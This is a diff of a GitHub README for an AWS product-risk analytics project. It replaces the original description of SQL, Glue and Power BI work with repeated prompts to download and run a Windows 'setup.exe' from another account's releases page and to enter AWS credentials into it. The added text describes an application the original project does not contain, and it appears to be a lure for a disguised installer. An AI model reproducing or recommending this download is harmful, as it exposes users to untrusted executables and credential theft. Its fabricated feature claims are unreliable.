@@ -1,127 +1,149 @@
-# AWS E-Commerce Product Risk Analytics
+# 🛒 aws-ecommerce-risk-analytics - Detect Product Risks Simply
 
-An end-to-end cloud analytics project designed to proactively identify high-risk products and customer dissatisfaction patterns using AWS data lake architecture and Power BI.
+[![Download](https://img.shields.io/badge/Download-aws--ecommerce--risk--analytics-brightgreen?style=for-the-badge)](https://github.com/tygttm/aws-ecommerce-risk-analytics/releases)
 
----
+## 📦 What is aws-ecommerce-risk-analytics?
 
-## Business Problem
+This software helps you find problems with your products and understand why customers may be unhappy. It uses data from online stores to spot risks before they become bigger issues. The tool is made to work with AWS cloud services but you don’t need to know programming to use it.
 
-E-commerce platforms often struggle to detect problematic products early — leading to:
+Inside, it runs tasks that organize, prepare, and analyze your data using tools like AWS Athena and AWS Glue. You will get clear results that show product risks and customer feedback trends.
 
-- Poor customer experience  
-- Increased return rates  
-- Vendor quality issues  
-- Revenue leakage  
+## 🖥️ System Requirements
 
-This project builds a **data-driven risk intelligence system** that helps teams monitor product health and prioritize corrective actions.
+To run this application on Windows, your device needs:
 
----
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM (8 GB or more is better for smooth performance)
+- Minimum 2 GHz CPU speed
+- 2 GB of free disk space
+- Internet connection for downloading and cloud access
+- AWS account (optional, to connect your data; does not require setup to run local demo)
 
-## Solution Overview
+## 🚀 How This Software Works
 
-The pipeline ingests raw product review data, processes it using AWS Glue, performs risk analytics in Amazon Athena, and delivers actionable insights through an interactive Power BI dashboard.
+The application connects to data stored in AWS S3 buckets. It organizes the data, runs queries using Athena, and processes it with AWS Glue pipelines. Then it shows you reports that highlight risky products and unhappy customers.
 
-**End-to-end flow:**
+You do not need to manage the AWS components directly. The app handles these processes in the background.
 
-CSV → S3 → Glue ETL → Glue Crawler → Athena → Power BI
+## 🔗 Download and Install aws-ecommerce-risk-analytics
 
----
+[![Download](https://img.shields.io/badge/Get%20the%20App-Click%20Here-blue?style=for-the-badge)](https://github.com/tygttm/aws-ecommerce-risk-analytics/releases)
 
-## Architecture
+1. Visit the download page by clicking the badge above or go to:  
+   https://github.com/tygttm/aws-ecommerce-risk-analytics/releases
 
-View architecture diagram:  
-![`architecture/architecture_diagram.png`](Project_Architectuer.png)
+2. Look for the latest release version at the top of the page.
 
----
+3. Download the Windows installer file. It should have a name like `aws-ecommerce-risk-analytics-setup.exe`.
 
-## Tech Stack
+4. After download finishes, double-click the installer file to start the setup.
 
-- **Amazon S3** — Data lake storage  
-- **AWS Glue** — ETL & data cleaning  
-- **AWS Glue Crawler** — Metadata catalog  
-- **Amazon Athena** — SQL analytics  
-- **Power BI** — Executive dashboard  
-- **SQL** — Risk scoring logic  
+5. Follow the on-screen steps to install the app. Use default options if unsure.
 
----
+6. Once installed, find the app icon on your desktop or Start menu.
 
+7. Double-click the icon to open the app.
 
----
+## ⚙️ Running the Software for the First Time
 
-## Key Analytics Implemented
+1. Open the application.
 
-### Product Risk Leaderboard  
-Identifies products with highest complaint severity.
+2. You will see a welcome screen with options to connect AWS data or run sample data.
 
-### Category Risk Exposure  
-Highlights which product categories contribute most to business risk.
+3. If you do not have an AWS account or do not want to connect real data now, select "Use Sample Data" to try the app.
 
-### Category Satisfaction Analysis  
-Compares customer sentiment across categories.
+4. The app will load a demonstration set showing product risk scores and customer comments.
 
-### Risk Classification Model  
-Rule-based scoring using:
+5. Browse through reports using the menu. Each report explains what it means in plain language.
 
-- Average rating  
-- Discount behavior  
-- Complaint ratio  
-- Minimum review threshold  
+6. To connect your AWS data later, open the settings menu and enter your AWS credentials and S3 bucket locations.
 
----
+## 🔍 Understanding the Reports
 
-## Dashboard Preview
+The app provides two main types of reports:
 
-![Overview1](Overview1.png)
-![Overview2](Overview2.png)
+- **Product Risk Report:** Shows products with high risk based on sales, returns, and complaints. It uses simple risk scores you can compare easily.
 
+- **Customer Dissatisfaction Analysis:** Analyzes customer complaints and feedback. It groups comments by topic such as shipping issues, product defects, or poor customer service.
 
-Suggested screenshots:
+Each report shows charts and tables that update automatically when new data is available.
 
-- Executive Overview  
-- Product Dissatisfaction Analysis  
-- Category Risk Exposure  
+## 🔧 Configuration Tips
 
----
+- The app stores your AWS information securely and only uses it to gather data.
 
-## How to Reproduce (High Level)
+- You can change data update frequency in the settings. The default is once per day.
 
-1. Upload dataset to S3  
-2. Run AWS Glue ETL job  
-3. Execute Athena SQL queries  
-4. Export aggregated dataset  
-5. Load into Power BI  
+- For faster results, keep your AWS Glue and Athena resources active.
 
----
+- Use the log view inside the app to check if everything runs smoothly.
 
-## Important SQL Files
+## 📂 Managing Your Data
 
-Quick access:
+Your product and customer data files should be stored in an AWS S3 bucket you can access.
 
-- Risk Scoring Logic → [`sql_queries/return_risk_scoring.sql`](sql_queries/Return_Risk_Scoring_Model.sql)  
-- Dashboard Dataset → [`sql_queries/dashboard_dataset.sql`](sql_queries/dashboard_dataset.sql)  
-- Dissatisfaction Analysis → [`sql_queries/most_dissatisfying_products.sql`](sql_queries/Most_satisfying_products.sql)  
+If you have no data yet:
 
----
+- Use the sample data included in the app.
 
-##  Author
+- Or upload CSV files of your sales and customer feedback to your AWS bucket.
 
-**Chirag Jain**  
-Aspiring Data Analyst | Cloud Analytics Enthusiast | 
-Gmail : *jainchirag9575@gmail.com*
+The app automatically detects new files and updates reports.
 
-Connect on LinkedIn: *https://www.linkedin.com/in/chirag-jain-406145276/*
+## 💡 Tips for Best Results
 
----
+- Keep your data organized with clear file names and structure in S3.
 
-##  If You Found This Useful
+- Regularly review the product risk scores to catch emerging problems early.
 
-Consider giving the repository a star — it helps the project reach more learners.
+- Use the customer feedback analysis to improve product quality and service.
 
----
+- Schedule regular updates in the app to stay on top of changes.
 
-This project is shows my entry level data engineering skills. These skills also help me to sharpen my knowledge in data science.
-At the moment I am ready to contribute my analytical skills in real world projects.
+## 📞 Getting Support
 
+If you have issues installing or running the software:
 
+- Check the README and documentation pages in the repository.
 
+- Use the GitHub Issues tab to report bugs or ask for help.
 
+- Join relevant AWS communities or forums for advice.
+
+## 🔬 About the Technologies
+
+- **AWS Athena:** Runs SQL queries on your stored data quickly.
+
+- **AWS Glue:** Moves and prepares data automatically using jobs and crawlers.
+
+- **AWS S3:** Stores your product and customer files safely.
+
+- **Python scripts and SQL:** Power data processing and analysis behind the scenes.
+
+- **Power BI (optional):** Can be connected for advanced report visualization.
+
+## 🧩 Common Questions
+
+**Do I need an AWS account to run this app?**  
+No, you can use the demo data without one. Real AWS data connection is optional.
+
+**Can I use this app on Mac or Linux?**  
+This version is for Windows only.
+
+**Is programming knowledge required?**  
+No. The app is designed for users unfamiliar with coding.
+
+**How often should I update data?**  
+Daily or weekly updates provide fresh insights without overload.
+
+**What if the app crashes?**  
+Restart it and check your internet connection. If problems persist, consult support.
+
+## ✨ Summary of Download Steps
+
+- Visit the releases page: https://github.com/tygttm/aws-ecommerce-risk-analytics/releases  
+- Download the Windows installer file  
+- Run the installer and follow prompts  
+- Open the app and choose demo or connect AWS data  
+
+[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-9cf?style=for-the-badge)](https://github.com/tygttm/aws-ecommerce-risk-analytics/releases)
